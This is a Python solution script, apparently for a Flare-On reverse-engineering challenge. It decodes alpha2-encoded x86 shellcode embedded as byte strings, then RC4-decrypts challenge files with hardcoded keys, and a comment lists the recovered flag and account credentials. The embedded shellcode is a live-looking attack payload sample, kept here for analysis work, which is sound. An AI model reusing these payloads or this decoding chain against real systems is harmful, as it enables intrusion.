from capstone import *
from binascii import unhexlify, hexlify
# mixedcase_unicode_decoders[] =
# { "esi",      "VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body }, 
# mixedcase_unicode_decoder_body
upacker = b'VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB'
payload = b'YlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA'

payload2 = b'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB'
payload2 = b'6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKP'

def decode(payload):
    '''decode the alpha2 shellcode'''
    ans = bytes([( ( ((payload[i]&0x0f) + ((payload[i+1]>>4)&0x0f))&0x0f )<<4 ) + (payload[i+1]&0x0f) for i in range(0, len(payload), 2)])
    print(ans.decode('latin-1'))
    # print(''.join('\\x{:02x}'.format(c) for c in ans))

    # with open('decode-std.bin', 'wb') as f:
    #     f.write(ans)
    return ans

def solve(a):
    '''RC4 decrypt'''
    with open('cipher.bin', 'rb') as f:
        ct = bytearray(f.read()[4:]) # first 4 bytes are length.
    print(ct)
    key = bytearray(b'killervulture123')
    buf = [i for i in range(256)]
    index = 0
    for i in range(256):
        index = (key[i&0xf] + buf[i] + index)&0xff
        buf[index], buf[i] = buf[i], buf[index]
    index2 = 0
    cnt = 0 
    for i in range(len(ct)):
        cnt += 1
        cnt &= 0xff
        index2 = (buf[cnt] + index2)&0xff
        v6 = buf[index2]
        buf[index2] = buf[cnt]
        buf[cnt] = v6
        v6 = (buf[index2] + v6)&0xff
        ct[i] ^= buf[v6]
    # with open('account.bin', 'wb') as f:
    #     f.write(ct)
    print(ct)

def stage2():
    key2 = b'intrepidmango'
    buf = [i for i in range(258)]
    index = 0
    for i in range(0x100):
        index = (buf[i] + key2[i%len(key2)] + index) & 0xff
        v8 = buf[i]
        buf[i] = buf[index]
        buf[index] = v8

    buf[256] = 0
    buf[257] = 0

    with open('passwd.bin', 'rb') as f:
        ct = bytearray(f.read())    

    for i in range(len(ct)):
        v1 = buf[256] + 1
        v2 = (buf[v1] + buf[257]) & 0xff
        buf[256] = v1
        buf[257] = v2
        v3 = buf[v2]
        buf[v2] = buf[v1]
        buf[v1] = v3
        ct[i] ^= buf[(buf[v2]+v3) & 0xff]
    print(ct)

    # roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat\r\nmoss:Pot-Pocket-Pigeon-Hunt-8:narwhal\r\njen:Straighten-Effective-Gift-Pity-1:bunny\r\nrichmond:Inventor-Hut-Autumn-Tray-6:bird\r\ndenholm:123:dog

ans = decode(payload)
solve(ans)
stage2()


# md = Cs(CS_ARCH_X86, CS_MODE_32)
# code = ''.join([chr(i)+'\x00' for i in payload])
# for i in md.disasm(ans.encode(), 0):
#     print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))

# c2b8c2b726c2bfc38ac39ac399c3997424c3b45d31c389c2b131314513034513c283c3ad4bc3844a365bc28bc2b5c387c29bc3ac3c22c2aa2c5a26c29cc29c286a10567cc29fc2a31ac2a9c29004c290c28fc29fc295c289c3acc2be15c3902061241b35606146c2b4303a0c6bc2a54f58c2b04e034cc2b0c2b3c3936fc29165683631c287c2bd4278c29fc2a26f3214101bc385c3bc69c3a46ac3814617720560c388017fc293751244c3aec2a1c2975f48210fc28469c3a6c3964f6543c29c0869527123c295c39f74c3a41cc29b5220457fc3ba71232e0361c28cc28fc2a1c3a920c39bc39bc2b32e1a69c38e1c1c71c3913075405ac39f025dc289c2a4c3adc2bf18c390c28519c38959c388c29927c29dc3b519c3825d0201c2a7584ec2855b10c39f605cc287c3a0c2a03f467328c3aec3adc3b3c38bc3ae00